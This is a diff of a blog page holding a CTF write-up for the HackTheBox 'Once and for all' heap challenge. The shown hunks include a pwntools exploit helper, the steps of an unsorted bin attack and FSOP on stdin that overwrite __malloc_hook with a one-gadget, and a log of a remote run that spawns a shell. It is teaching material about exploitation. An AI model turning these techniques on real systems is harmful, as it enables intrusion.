@@ -14,7 +14,9 @@
 
 
 
-  <meta name="description" content="Once and for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin." />
+  <meta name="description" content="Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin. Find the tasks and the final exploit hereand here.
+Reverse engineering     All the snippets of pseudo-code are issued by IDA freeware:
+int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp&#43;18h] [rbp-8h] BYREF  int i; // [rsp&#43;1Ch] [rbp-4h]  for ( i = 0; i &lt;= 49; &#43;&#43;i ) { puts(s); printf(&amp;unk_1310); __isoc99_scanf(&amp;unk_13C8, &amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(&#34;[-] Invalid choice!" />
 
 
   <meta name="keywords" content="pwn,binary exploitation,cryptography,Reverse engineering,hypervisor" />
@@ -65,7 +67,11 @@
 <meta
   property="og:description"
   content="
-    Once and for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
+    
+      Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin. Find the tasks and the final exploit hereand here.
+Reverse engineering     All the snippets of pseudo-code are issued by IDA freeware:
+int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp&#43;18h] [rbp-8h] BYREF  int i; // [rsp&#43;1Ch] [rbp-4h]  for ( i = 0; i &lt;= 49; &#43;&#43;i ) { puts(s); printf(&amp;unk_1310); __isoc99_scanf(&amp;unk_13C8, &amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(&#34;[-] Invalid choice!
+    
   "
 />
 <meta property="og:type" content="article" />
@@ -92,7 +98,11 @@
 <meta
   name="twitter:description"
   content="
-    Once and for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
+    
+      Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin. Find the tasks and the final exploit hereand here.
+Reverse engineering     All the snippets of pseudo-code are issued by IDA freeware:
+int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp&#43;18h] [rbp-8h] BYREF  int i; // [rsp&#43;1Ch] [rbp-4h]  for ( i = 0; i &lt;= 49; &#43;&#43;i ) { puts(s); printf(&amp;unk_1310); __isoc99_scanf(&amp;unk_13C8, &amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(&#34;[-] Invalid choice!
+    
   "
 />
 
@@ -184,7 +194,7 @@
     "name": "[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all",
     "headline": "[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all",
     "alternativeHeadline": "",
-    "description": "Once and for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.\nReverse engineering     All the snippets of pseudo-code are issued by IDA freeware:\nint __cdecl main(int argc, const char **argv, const char **envp) { int v4; \/\/ [rsp\u002b18h] [rbp-8h] BYREF  int i; \/\/ [rsp\u002b1Ch] [rbp-4h]  for ( i = 0; i \u0026lt;= 49; \u002b\u002bi ) { puts(s); printf(\u0026amp;unk_1310); __isoc99_scanf(\u0026amp;unk_13C8, \u0026amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(\u0026#34;[-] Invalid choice!",
+    "description": "Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin. Find the tasks and the final exploit hereand here.\nReverse engineering     All the snippets of pseudo-code are issued by IDA freeware:\nint __cdecl main(int argc, const char **argv, const char **envp) { int v4; \/\/ [rsp\u002b18h] [rbp-8h] BYREF  int i; \/\/ [rsp\u002b1Ch] [rbp-4h]  for ( i = 0; i \u0026lt;= 49; \u002b\u002bi ) { puts(s); printf(\u0026amp;unk_1310); __isoc99_scanf(\u0026amp;unk_13C8, \u0026amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(\u0026#34;[-] Invalid choice!",
     "inLanguage": "en",
     "isFamilyFriendly": "true",
     "mainEntityOfPage": {
@@ -208,13 +218,13 @@
         "url": "https://nasm.re",
         "logo": {
             "@type": "ImageObject",
-            "url": "https:\/\/nasm.re\/maths.png",
+            "url": "https:\/\/nasm.re\/risa.png",
             "width":"32",
             "height":"32"
         }
     },
     "url" : "https:\/\/nasm.re\/posts\/onceandforall\/",
-    "wordCount" : "3296",
+    "wordCount" : "3315",
     "genre" : [ "ctf" , "HackTheBox" ]
 }
 </script>
@@ -243,7 +253,7 @@
         <span class="gblog-brand flex align-center justify-center">
           <img
             class="gblog-brand__img"
-            src="/maths.png"
+            src="/risa.png"
             alt=""
           />
           <span class="gblog-brand__title">repr</span>
@@ -378,6 +388,25 @@
 
 
 
+  
+    
+    
+      
+        <span class="flex align-center no-wrap">
+          <svg class="icon gblog_person"><use xlink:href="#gblog_person"></use></svg>
+          
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a class="gblog-button__link" href="/authors/nasm/" title="All posts of this author">
+      nasm
+    </a>
+  </span>
+
+        </span>
+      
+    
+    
+  
+
 
 
 
@@ -431,7 +460,18 @@
       
     </header>
     <section class="gblog-markdown">
-      <p>Once and for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.</p>
+      <p>Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
+Find the tasks and the final exploit <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/"
+  
+  >here</a
+> and <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py"
+  
+  >here</a
+>.</p>
 <div class="gblog-post__anchorwrap">
     <h1 id="reverse-engineering">
         Reverse engineering
@@ -480,7 +520,7 @@
   <span class="p">}</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</code></pre></div><p>The binary allows us to allocate a small chunk between <code>0x1f</code> and <code>0x38</code> bytes:</p>
+</code></pre></div><p>The binary allows you to allocate a small chunk beetween <code>0x1f</code> and <code>0x38</code> bytes:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">small_alloc</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
@@ -511,7 +551,7 @@
   <span class="cp"># off-by-one
 </span><span class="cp"></span>  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">alloc_array</span><span class="p">)[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">[</span><span class="mi">0</span><span class="p">]],</span> <span class="n">nmemb</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
 <span class="p">}</span>
-</code></pre></div><p>As you can see the function above contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.</p>
+</code></pre></div><p>As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.</p>
 <p>The fix function frees a chunk and asks for another size, then it allocates another chunk with <code>calloc</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">fix</span><span class="p">()</span>
 <span class="p">{</span>
@@ -560,7 +600,7 @@
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div><p>If we reach <code>[1]</code>, <code>alloc_array[2 * idx]</code> is freed leading to a double free.</p>
-<p>We can print a chunk only once:</p>
+<p>We can print a chunk only one time:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">examine</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h] BYREF
@@ -575,7 +615,7 @@
   <span class="k">else</span>
     <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid!&#34;</span><span class="p">);</span>
 <span class="p">}</span>
-</code></pre></div><p>Finally we can malloc a huge chunk, but we cannot write anything within:</p>
+</code></pre></div><p>Finally we can malloc a huge chunk, but we cannot wriet anything within:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">savebig</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">void</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
@@ -620,7 +660,7 @@
     </h2>
 </div>
 <ul>
-<li>An off-by-one when we create a new chunk.</li>
+<li>An off-by-one when we create a new chunk</li>
 <li>Double free by calling <code>fix</code> and then providing an invalid size.</li>
 <li>Trivial read after free thanks to the double free.</li>
 </ul>
@@ -633,7 +673,7 @@
     </h2>
 </div>
 <ul>
-<li>The program does not use <code>printf</code> with a format specifier, then we cannot do a <a
+<li>The program does not use <code>printf</code> with a format specifer, then we cannot do a <a
   class="gblog-markdown__link"
   href="https://maxwelldulin.com/BlogPost?post=3107454976"
   
@@ -647,7 +687,7 @@
   
   >House of Orange</a
 > and introduces the <code>tcache</code>.</li>
-<li>Allocations have to fit in only two fastbins (<code>0x30</code> / <code>0x40</code>), which means we cannot get an arbitrary write with a <code>fastbin dup</code> technique due to the size of most of interesting memory areas in the libc (<code>0x7f</code> =&gt; <code>0x70</code> fastbin against <code>0x30</code> / <code>0x40</code> in our case).</li>
+<li>Allocations have to fit in only two fastbins (<code>0x30</code> / <code>0x40</code>), which means we cannot get an arbitrary with a <code>fastbin dup</code> technique due to the size of most of interesting memory areas in the libc (<code>0x7f</code> =&gt; <code>0x70</code> fastbin against <code>0x30</code> / <code>0x40</code> in our case).</li>
 </ul>
 <div class="gblog-post__anchorwrap">
     <h2 id="how-to-leak-libc-">
@@ -657,7 +697,7 @@
         </a>
     </h2>
 </div>
-<p>Partial overwrites are as far as I know very hard to get because of <code>calloc</code>. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunk that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&rsquo;s size field with a bigger one that would correspond to the unsorted bin (<code>&gt;= 0x90</code>). We can edit the size of the second chunk from <code>0x30</code> to <code>0xb0</code> by doing:</p>
+<p>Partial overwrites are as far as I know very hard to get because of <code>calloc</code>. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&rsquo;s size field with a bigger one that would correspond to the unsorted bin (<code>&gt;= 0x90</code>). We can edit the size of the second chunk from <code>0x30</code> to <code>0xb0</code> by doing:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
@@ -735,11 +775,11 @@
 </span><span class="s2">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
 </span><span class="s2">&#34;&#34;&#34;</span>
 
-</code></pre></div><p>We allocate 6 chunks, we need 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> = <code>0x555555608690</code>, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you&rsquo;re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a
+</code></pre></div><p>We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> = <code>0x555555608690</code>, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you&rsquo;re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a
   class="gblog-markdown__link"
   href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks"
   
-  >this ressource</a
+  >this resource</a
 >.</p>
 <p>Now that <code>chunk_2</code> has been tampered with a fake <code>0xb0</code> size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
@@ -811,7 +851,7 @@
         </a>
     </h2>
 </div>
-<p>There are a lot of ways to achieve code execution according to what I&rsquo;ve read in other write-ups, I choose to attack <code>_IO_stdin</code> by running an unsorted bin attack on its <code>_IO_buf_end</code> field which holds the end of the internal buffer of <code>stdin</code> from <code>_IO_buf_base</code>, according to the <a
+<p>There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack <code>_IO_stdin</code> by running an unsorted bin attack on its <code>_IO_buf_end</code> field which holds the end of the internal buffer of <code>stdin</code> from <code>_IO_buf_base</code>, according to the <a
   class="gblog-markdown__link"
   href="https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469"
   
@@ -979,13 +1019,13 @@ $1 = {
   _mode = -1,
   _unused2 = '\000' &lt;repeats 19 times&gt;
 }
-</code></pre><p>As you can see right above and according to the source code showed previously, <code>_IO_stdin-&gt;_IO_buf_base</code> points toward <code>_IO_stdin-&gt;_shortbuf</code>, an internal buffer directly in <code>stdin</code>. And <code>&amp;unsortedbin &gt; _IO_buf_base &gt; stdin</code>. If you do not fully understand my explanations, I advise you to take a look at <a
+</code></pre><p>As you can see right above and according to the source code showed previously, <code>_IO_stdin-&gt;_IO_buf_base</code> points toward <code>_IO_stdin-&gt;_shortbuf</code>, an internal buffer directly in <code>stdin</code>. And <code>&amp;unsortedbin &gt; _IO_buf_base &gt; stdin</code>. If you do not understand fully my explanations, I advise you to take a look at <a
   class="gblog-markdown__link"
   href="https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/"
   
   >this great article</a
 >.</p>
-<p>Then we should be able to control every byte between <code>&amp;stdin-&gt;_shortbuf</code> and <code>&amp;unsortedbin</code>. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: <code>__malloc_hook</code> !!</p>
+<p>Then we should be able to control every bytes between <code>&amp;stdin-&gt;_shortbuf</code> and <code>&amp;unsortedbin</code>. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: <code>__malloc_hook</code> !!</p>
 <p>Then we just have to overwrite the pointers inside <code>stdin</code>, <code>_IO_wide_data_0</code> and <code>__memalign_hook</code> to finally reach <code>__malloc_hook</code> and write the address of a one-gadget !</p>
 <div class="gblog-post__anchorwrap">
     <h2 id="unsorted-bin-attack-on-stdin-_io_buf_end">
@@ -995,18 +1035,18 @@ $1 = {
         </a>
     </h2>
 </div>
-<p>Here was the theory, now let&rsquo;s see how we can do that. To understand unsorted bin attacks <a
+<p>Here was theory, let&rsquo;s see how we can do that. To understand unsorted bin attack <a
   class="gblog-markdown__link"
   href="https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/"
   
   >here</a
-> is a good article on the subject. The unsorted bin attack using partial unlink is basically:</p>
+> is a good article about unsorted bin attack. The unsorted bin attack using partial unlink is basically:</p>
 <ul>
-<li>Overwrite the backward pointer of the last chunk in the unsorted bin by <code>&amp;target - 0x10</code>.</li>
-<li>Request the <strong>exact</strong> size of the last chunk in the unsorted bin.</li>
-<li>It should write at <code>&amp;target</code> the address of the unsorted bin.</li>
+<li>overwrite the backward pointer of the last chunk in the unsorted bin by <code>&amp;target - 0x10</code></li>
+<li>request the <strong>exact</strong> size of the last chunk in the unsorted bin</li>
+<li>It should write at <code>&amp;target</code> the address of the unsorted bin</li>
 </ul>
-<p>An essential thing to note is that if there are no chunks in your fastbin / smallbin and that you&rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&rsquo;t fit the request, the program will most of the time issue a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a
+<p>An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you&rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&rsquo;t fit the request, the program will most of the time issues a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a
   class="gblog-markdown__link"
   href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519"
   
@@ -1032,7 +1072,7 @@ $1 = {
 
           <span class="cm">/*
 </span><span class="cm">             If a small request, try to use last remainder if it is the
-</span><span class="cm">             only chunk in unsorted bin. This helps promote locality for
+</span><span class="cm">             only chunk in unsorted bin.  This helps promote locality for
 </span><span class="cm">             runs of consecutive small requests. This is the only
 </span><span class="cm">             exception to best-fit, and applies only when there is
 </span><span class="cm">             no exact fit for a small chunk.
@@ -1195,7 +1235,7 @@ $1 = {
 </span><span class="s2">constraints:
 </span><span class="s2">  [rsp+0x70] == NULL
 </span><span class="s2">&#34;&#34;&#34;</span>
-</code></pre></div><p>The <code>4\n\x00\x00\x00</code> corresponds to the option that asks for the huge chunk (we cannot allocate anymore standards chunks) which will trigger <code>__malloc_hook</code> :).</p>
+</code></pre></div><p>The <code>4\n\x00\x00\x00</code> corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger <code>__malloc_hook</code> :).</p>
 <p>Which gives:</p>
 <pre tabindex="0"><code>root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
 [*] '/mnt/once_and_for_all'
@@ -1217,7 +1257,18 @@ glibc
 once_and_for_all
 $ cat flag.txt
 HTB{m4y_th3_f0rc3_b3_w1th_B0Nn13!}
-</code></pre>
+</code></pre><p>Find the tasks and the final exploit <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/"
+  
+  >here</a
+> and <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py"
+  
+  >here</a
+>.</p>
+
     </section>
   </article>
 
